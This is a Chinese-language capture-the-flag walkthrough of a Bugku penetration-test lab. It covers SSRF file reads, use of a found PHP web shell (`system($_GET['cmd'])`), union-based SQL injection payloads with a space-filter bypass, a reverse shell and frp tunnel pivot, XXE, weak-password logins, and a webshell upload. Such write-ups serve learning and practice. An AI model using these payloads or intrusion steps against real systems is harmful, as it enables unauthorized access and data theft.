# 前言

Bugku的PAR模式，渗透测试3，共8个flag，这次打靶挺轻松，感觉比较简单，一次过，嘿嘿。在此，分享出来笔者的过程，并呈现自己的思考，同时也希望能获得大佬的指点。

# 过程

![](../Images/fd7ebac497ada946b8d8d177bad65afd.png)

## 0x01 flag1 （ssrf）

![](../Images/a66c4d71cf4d7ead8394045e1873c84c.png)  
开启靶场，依旧是给了个ip:80，不过题目给了个打进内网的提示，  
先上nmap扫一下  
![](../Images/6b8676971c8f62a1dd0531a3bc0b65bf.png)  
从80端口开始吧，访问80端口  
![](../Images/929a21a1bddb9c6740cca3af804be935.png)  
一个站点快照获取的功能，其实打过ctf的都知道这应该会有ssrf漏洞，  
那么在已知这是一个php站点，且有着ssrf漏洞的情况下，我们应该如何利用呢？

```




http://：探测内网主机存活、端口开放情况
```

先利用file协议看一下当前源代码，填入file:///var/www/html/index.php，右键点击查看页面源代码，发现源码  
![](../Images/3c1b44f3a87710106bf45806f3757d3f.png)  
能看到源码就证明了我们之前的猜想是正确的，那么现在我们就已经可以直接读取当前机子里边的flag了，让我猜猜看，flag在根目录下  
![](../Images/5d41ca0b408624bd1b64ff67484fb11f.png)

## 0x02 flag2、flag3（shell.php）

题目给了个提示  
![](../Images/104f2aa2e132c64f2c9f8d25ff89411f.png)  
但是暂时不太明白有什么用，继续利用file协议查看一下当前机子的网络信息  
![](../Images/5d5d2c846332398192c693ba28ee5466.png)  
提示有一个192.168.0.2/24网段，填入http://192.168.0.1，然后抓包爆破最后一位数，通过返回包长度来探测局域网内有哪些机子开了80端口  
![](../Images/bf23da817e844ad0753a9eeedb8fc6df.png)  
根据返回长度，可以直接判断出来这个网段里有四台不同的机子，回到web界面，看看http://192.168.0.10的快照  
![](../Images/8c662a1749b515394cd866df5d5bd24d.png)  
嘿，这是挂了个黑页是吧，页面源代码也没有什么东西  
![](../Images/18ba202e8185ec3e1839932085e7b787.png)  
用burp抓到获取快照的请求包，然后发送到Intruder爆破一下目录看看，  
![](../Images/d373775d17f8d555dfbc2fcec5a05e4d.png)  
根据返回包长度发现那个站点有shell.php文件，根据返回包可以知道该文件大致内容为

```

<?php system($_GET['cmd']);?>
```

直接cmd传参执行命令，看看当前目录，和根目录下  
![](../Images/dd2156f35294ad50d42488b1f6c2c0a1.png)  
![](../Images/a931775bce87ee1752715d044489b6b5.png)  
拿下两个flag  
![](../Images/a68800240cf80e88536c6cb0a21e5bf7.png)

## flag4（sql注入）

还记得之前爆破探测出来的url里还有两台机子，按顺序来，先看看192.168.0.138  
![](../Images/56c32890ac987ed1a4cb35eb1a45b0ed.png)  
估摸着是sql注入，查看源代码知道这是get传参id  
![](../Images/a71935ef15df9cf909b92d8df1aee523.png)  
输入一个1' or 1=1#进去发现有问题  
![](../Images/36ceafa6d29db8d43c6472f44cf4255e.png)  
经过一段时间的fuzz后，发现这个过滤了空格，选用+代替空格从而绕过，先看一下回显点

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,2,3,4
```

![](../Images/0d04195ad7af4399b359cfb9f810595e.png)  
查数据库名

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,4
```

![](../Images/6981410dc7b9bc88d17fc5ca7c1edc4a.png)  
接下来查表名，因为只能显示一行的数据，所以我们需要用order by来获取更多的数据，order by 1查出的表名为double

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,TABLE_NAME+from+information_schema.tables+where+TABLE_SCHEMA="bugku_sql"+order+by+1
```

![](../Images/f0cf0f3185a18365a55ab8ee5ef79c41.png)  
order by 2 查出的表名为flag，那么flag应该就在这个表里了吧  
![](../Images/499f6e763e37d5f4db7f94465f7ef2f4.png)  
继续查列名，比较幸运，order by 1就是flag

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,COLUMN_NAME+from+information_schema.COLUMNS+where+TABLE_SCHEMA="bugku_sql"+and+TABLE_NAME="double"+order+by+1
```

![](../Images/cd166cf64c7ff99a18f7879cfaa0d36c.png)  
直接出flag

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,flag+from+bugku_sql.flag
```

![](../Images/3077a46a58d06f7a33380d5d459464fd.png)

## flag7、flag8（xxe）

最后一台机子是192.168.0.250，获取快照是一个登录界面，通过ssrf去做这个不是很方便，回顾之前有一台被黑了的可以执行任意命令的机子，先看看命令ls /usr/bin  
![](../Images/bd4ad788d7fcb75e640dfb89140234cb.png)  
有wget命令，先从公网vps上下载frpc，想挂一个代理开个socks5隧道，方便后续的操作，结果发现这样，添加不了执行权限  
![](../Images/3a8fd8faf10bb77f611e460c1fb20e6f.png)  
![](../Images/b0feb991e7ea38d55756e351daf0c570.png)  
看来得先试试反弹shell，在用户命令中看到了nc  
使用nc进行shell反弹  
![](../Images/e311f74ab95bc09855ea495df68b8f39.png)  
接收到shell后，再给frpc加上执行权限，这次成功了  
![](../Images/10dd50fa92d464e8d749633b6e218eee.png)  
顺利搭建隧道，访问192.168.0.250  
![](../Images/ae7e2e4d5976ce10cb917f5c685fd794.png)  
尝试一波弱口令admin/admin，登录成功，但是并没有进行跳转，依旧留在了当前页面  
![](../Images/0c0f6211b027ca5ca1cd3707c772d056.png)  
嗯，有点迷，抓包看看返回包  
![](../Images/f1d6bbf1f78786033c6eb9154a868bca.png)  
嘿，你说这个像不像xxe，盲猜flag在当前目录和根目录下，直接读，成功拿下  
![](../Images/68810d99284ff3fc43e5486833dc660d.png)  
![](../Images/46a9c3c93ff3600aa014785cefe559a6.png)

## flag5、flag6（内网）

提交完上面的flag后发现这是flag7、和flag8呀，好家伙我的flag5和flag6呢？  
![](../Images/6f4d1080eee2c56ddad8bd571b24a64a.png)  
回顾之前的四台机子，只有192.168.0.10这台咱们能拿下shell，要不看看内网？  
![](../Images/7d806bf6c632fdd8c07422cc2716dabf.png)  
果然还有一层网段为10.10.0.5/24  
上fscan扫一下，但是扫不出任何信息  
![](../Images/135c312c99c9892a40c2a010629b3165.png)  
这就有点离谱了，为啥呢，我不理解呜呜呜  
之后换了种方式，使用proxychains4转到kali用nmap扫一下  
![](../Images/e847cc885e55bdb0b713e0bf47d5e731.png)  
这下扫出来一台10.10.0.22:80，不过为什么fscan会扫不出来呢，还是不明白  
之前已经挂上frp代理开了socks5隧道了，所以浏览器直接访问10.10.0.22:80  
![](../Images/693afaf72b90c65d69fd8cab3447821f.png)  
使用kali自带工具dirb扫一波目录，扫出来admin.php，需要登录，依旧是弱口令admin/admin  
![](../Images/06465109c808a7688d38720f90d85aaa.png)  
登录后跳转到了首页，细心的我们可以发现这是我们已经有了编辑权限  
![](../Images/fe4f12963f25e86c9366f806e11f2b93.png)  
点击管理  
![](../Images/931ea9012a62830f379267980fb6f352.png)  
里边有一个文件夹管理，点进去看看  
可以上传文件  
![](../Images/72071de58adf02edcaa239c28c63a6e4.png)  
![](../Images/37628e98c368d005fd9ca61fba820176.png)  
当前是media目录看看files目录，  
![](../Images/2451b8dfffa2cc7f434c90b499fbc65c.png)  
就俩文件，看看.htaccess文件，发现只解析php后缀的文件  
![](../Images/b1d951e06c1381330f1a2119e91e9450.png)  
直接上一句话木马加蚁剑，在根目录和网站根目录下拿到最后两个flag  
![](../Images/cdd8e4bc9ba76e5344e713bd4d2831e6.png)  
![](../Images/a76ed96023a581764db9333031094937.png)
